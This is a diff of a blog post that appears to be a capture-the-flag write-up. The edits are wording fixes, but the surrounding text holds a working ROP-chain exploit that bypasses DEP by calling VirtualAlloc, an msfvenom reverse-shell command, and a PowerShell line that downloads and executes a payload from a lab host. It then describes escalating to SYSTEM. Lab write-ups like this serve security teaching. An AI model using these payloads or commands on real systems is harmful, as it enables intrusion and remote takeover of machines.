@@ -289,7 +289,7 @@ rop += p32(0x41424344) #junk for ebp
 
 We used an addition, but we "pop" a negative value. This is done to avoid NULL bytes. _ECX_ now has the value of the stack-0x50, and we'll use it to point to our stub
 
-Next, We need to move the value of __TLSFree__  to a register. Since we have the IAT address stored in *tlsfree_iat*, we can dereference it and then subtract the Offset from __VirtualAlloc__
+Next, We need to move the value of __TLSFree__ to a register. Since we have the IAT address stored in *tlsfree_iat*, we can dereference it and then subtract the Offset from __VirtualAlloc__
 
 
 ```python
@@ -373,7 +373,7 @@ rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 ```
-Let's set up now the _flAllocationType_ argument to 0x1000. Nothing fancy here. Just the same we are doing  negating the value and then increasing it. (to avoid NULL and/or badchars)
+Continuing, let's set up now the _flAllocationType_ argument to 0x1000. Nothing fancy here. Just the same we are doing  negating the value and then increasing it. (to avoid NULL and/or badchars)
 
 ```python
 rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
@@ -396,7 +396,7 @@ rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 ```
 
-The argument left to set in the stub is flProtect, which needs to be 0x40 in order to set the permissions of the memory we are allocating as RWX, and this way bypasses the _DEP_ protection. Let's use one more time the negate trick to accomplish this.
+The argument left to set in the stub is _flProtect_, which needs to be 0x40 in order to set the permissions of the memory we are allocating as _RWX_, and this way bypasses the _DEP_ protection. Let's use one more time the _negate_ trick to accomplish this.
 
 ```python
 rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
@@ -406,7 +406,7 @@ rop += p32(0x41424344) #junk for EBP
 rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
 ```
 
-Now the only thing left to add to our chain is a jump to our Shellcode. The way I did this was by calculating the difference between the current stub-pointer in the stack and the Shellcode. Which was 0x14, so we can move the stub-pointer to _EAX_ and then add 0x14 by doing a negative subtraction with _EDX_ . Finally, we can use the "xchg esp, eax; ret;" to set the value of the stack to it, so after the ret, we should land in our payload.
+Now, the only thing left to add to our chain is a jump to our Shellcode. The way I did this was by calculating the difference between the current stub-pointer in the stack and the Shellcode. Which was 0x14, so we can move the stub-pointer to _EAX_ and then add 0x14 by doing a negative subtraction with _EDX_ . Finally, we can use the "xchg esp, eax; ret;"  gadget to set the value of the stack to it, so after the return, we should land in our payload.
 
 
 ```python
@@ -417,12 +417,12 @@ rop += p32(filesrv+0x0003697f) # add eax, edx; ret;
 rop += p32(filesrv+0x00066ab3) # xchg esp, eax; ret;
 ```
 
-We can test the above by creating a variable, _Shellcode_.
+We can test the above by creating a variable, _Shellcode_ with the int3 char, that should stop execution, acting as a break-point, if _DEP_ is disabled.
 
 ```python
 shellcode = b"\xcc"*300
 ```
-And adding it to our payload, as shown below.
+And then, adding it to our payload to be sent, as shown below.
 
 ```python
 payload  = b""
@@ -439,17 +439,17 @@ r.sendline(payload)
 r.close()
 ```
 
-We can corroborate our chain is working using the debugger. We should stop before the _CC_ (breakpoint) instruction is executed.
+We can corroborate our rop-chain is working using the debugger. We should stop before the _CC_ (breakpoint) instruction is executed.
 
 ![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-08-35.png)
 
-Yay! Now we can execute on the stack (we can confirm by executing on the debugger). We also can control the execution to point to our desired Shellcode, so we can send a reverse shell. At the time, I used the following msfvenom command to generate it.
+Yay! Now we can execute on the stack (we can confirm by executing on the debugger). We also can control the execution to point to our desired Shellcode, so we can send a reverse shell. At the time, I used the following __msfvenom__ command to generate it.
 
 ```
 msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=1337 -b"\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
 ```
 
-Let's replace our shellcode variable with the one generated with _msfvenom_. You can verify that it is working in your local VM  before sending the payload if you need to. The only thing and this is maybe due to latency, but  I have to put a _sleep()_ call before sending the payload to avoid some weird crashes, as shown below.
+Let's replace our shellcode variable with the one generated with _msfvenom_. You can verify that it is working in your local VM  before sending the payload if you need to. The only thing and this is maybe due to latency, but  I had to put a _sleep()_ call before sending the payload to avoid some weird crashes, as shown below.
 
 ```python
 payload  = b""
@@ -466,7 +466,7 @@ sleep(2)
 r.close()
 ```
 
-Now let's fire up the exploit and....
+Now let's fire-up the exploit and....
 
 
 ![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-28-28.png)
@@ -484,7 +484,7 @@ C:\shared>
 
 ![](https://media.tenor.com/HMsPIS-VAxAAAAAC/gandalf-lotr.gif)
 
-After going for the user flag (LOL) we can escalate privileges to get an admin shell. For that, we check our privileges and groups using __whoami /all__ we'll receive an output similar to the one below.
+After going for the user flag (LOL) we can escalate privileges to get an SYSTEN shell. For that, we check our privileges and groups using the __whoami /all__ comman. We'll receive an output similar to the one below.
 
 ```
 C:\shared>whoami /all
@@ -531,20 +531,20 @@ C:\shared>
 ```
 We can observe we have a high-integrity shell, and we are part of NT AUTHORITY. So after all that ropping, I went the easy way and first called a PowerShell reverse_shell and generate a 32-bit meterpreter shell  (remember, we are running on an x86 process).
 
-We then can host the shell in a Python web server and execute PowerShell in our shell and download and execute the meterpreter reverse shell with the followign command
+Next, let's host the reverse shell in a Python web server. and execute PowerShell to download and execute the meterpreter reverse shell with the followign command.
 
 ```
 (new-object system.net.webclient).DownloadString('http://10.8.0.138/dplashell.txt') | IEX
 ```
-Now we got a meterpreter session. 
+We got a meterpreter session. 
 
 ![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-40-40.png)
 
-Getting SYSTEM is now trivial. We can just migrate to a SYSTEM process, like the _spoolsv_ process, and use the __migrate__ command in Metasploit to accomplish this.
+Elevating privileges is now trivial. Migrating to a SYSTEM process, like the _spoolsv_ process, and use the __migrate__ command in Metasploit we'll be enough to accomplish this.
 
 ![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-44-42.png)
 
-We are now SYSTEM!! After some root-dance we can read the root.txt.
+We are now SYSTEM!! And after some root-dance we can read the root.txt.
 
 ![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-47-29.png)
 
